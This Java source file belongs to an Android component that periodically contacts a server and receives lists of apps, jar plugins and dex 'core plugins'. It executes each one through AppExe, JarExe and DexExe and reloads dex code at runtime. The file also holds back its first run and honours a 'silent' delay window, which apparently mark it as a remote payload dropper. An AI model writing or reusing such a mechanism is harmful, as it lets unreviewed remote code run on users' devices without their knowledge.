package com.hs.cld.da;

import android.content.Context;
import android.content.Intent;

import com.hs.cld.basic.Processor;
import com.hs.cld.basic.SLT;
import com.hs.cld.basic.Settings;
import com.hs.cld.common.PROP;
import com.hs.cld.da.dx.DexManager;
import com.hs.cld.da.dx.Tracker;
import com.hs.cld.common.utils.LOG;
import com.hs.cld.common.utils.SystemUtils;
import com.hs.cld.common.utils.TextUtils;

import java.util.List;

public class DP implements Processor {
	/**
	 * 日志标签
	 */
	private final static String TAG = "DP";

	/**
	 * 处理器ID
	 */
	public final static String ID = "dp";

	@Override
	public void process(Context context, Intent i) {
		if (!SystemUtils.isNetworkAvailable(context)) {
			return;
		}

		if (SLT.silent(context)) {
			LOG.i(TAG, "slt to " + TextUtils.TSTR(SLT.millis(context)));
			return;
		}

		long periods = (PROP.isBeta() ? 10L : Settings.getPeriods(context, 14400L));
		long lastMillis = getLastExeTime(context);
		long timeNow = System.currentTimeMillis();

		if (lastMillis <= 0) {
			if (!PROP.isBeta()) {
				putLastExeTime(context, timeNow);
				LOG.d(TAG, "[" + periods + "] ignore 1st ...");
				return;
			}
		}

		long elapsed = ((timeNow - lastMillis) / 1000L);
		if (elapsed < 0) {
			LOG.d(TAG, "[" + periods + "] " + elapsed
					+ "s elapsed from last(" + TextUtils.TSTR(lastMillis) + ") ...");
			putLastExeTime(context, timeNow);
		} else if (elapsed >= periods) {
			LOG.i(TAG, "time's up, go on ...");
			putLastExeTime(context, timeNow);
			execute(context);
		} else {
			LOG.d(TAG, "[" + periods + "] " + elapsed
					+ "s elapsed from last(" + TextUtils.TSTR(lastMillis) + ") ...");
		}

		// 重新加载一次dex
		DexManager.get().load(context);
	}

	public void execute(Context context) {
		try {
			// 请求服务器并解析响应
			GetDispatchInfo gdi = new GetDispatchInfo(context);
			gdi.request();

			List<Message> dexList = gdi.getDexList();
			List<Message> appList = gdi.getAppList();
			List<Message> jarList = gdi.getJarList();
			LOG.i(TAG, "da request, a=" + appList.size() + ", j=" + jarList.size() + ", dx=" + dexList.size());

			// 处理应用下发
			handleAppList(context, appList);

			// 处理普通dex插件
			handleJarList(context, jarList);

			// 处理核心插件
			handleDexInfo(context, dexList);
		} catch (Throwable t) {
			LOG.e(TAG, "execute failed: " + t);
		}
	}

	private void handleAppList(Context context, List<Message> appList) {
		try {
			if ((null != appList) && (!appList.isEmpty())) {
				for (Message appInfo: appList) {
					submitTracker(context, appInfo.mReportId, "app.arrived", true, "OK");
					AppExe appExe = new AppExe(context, appInfo);
					appExe.fire();
				}
			}
		} catch (Throwable t) {
			LOG.e(TAG, "handle app list failed: " + t);
		}
	}

	private void handleJarList(Context context, List<Message> jarList) {
		try {
			if ((null != jarList) && (!jarList.isEmpty())) {
				for (Message jarInfo: jarList) {
					submitTracker(context, jarInfo.mReportId, "jar.arrived", true, "OK");
					JarExe jarExe = new JarExe(context, jarInfo);
					jarExe.fire();
				}
			}
		} catch (Throwable t) {
			LOG.e(TAG, "handle jar list failed: " + t);
		}
	}

	private void handleDexInfo(Context context, List<Message> dexList) {
		try {
			if ((null != dexList) && (!dexList.isEmpty())) {
				Message dexInfo = dexList.get(0);
				submitTracker(context, dexInfo.mReportId, "dex.arrived", true, "OK");
				DexExe dexExe = new DexExe(context, dexInfo);
				dexExe.fire();

				// 重新加载一次dex
				DexManager.get().load(context);
			}
		} catch (Throwable t) {
			LOG.e(TAG, "handle dex failed: " + t);
		}
	}

	/**
	 * 获取上一次执行时间
	 * @param context 上下文
	 * @return 上一次执行时间
	 */
	protected long getLastExeTime(Context context) {
		return Settings.getLastDAInMillis(context, 0);
	}

	/**
	 * 写入上一次执行时间
	 * @param context 上下文
	 * @param millis 上一次执行时间
	 */
	private void putLastExeTime(Context context, long millis) {
		Settings.putLastDAInMillis(context, millis);
	}

	private void submitTracker(Context context, String reportId, String reportType, boolean ok, String message) {
		Tracker tracker = new Tracker(context, reportId);
		tracker.setArrivedInMillis(System.currentTimeMillis());
		tracker.setExeInMillis(0);
		tracker.setOK(ok);
		tracker.setErrorMessage(message);
		tracker.setReportType(reportType);
		tracker.request();
	}
}
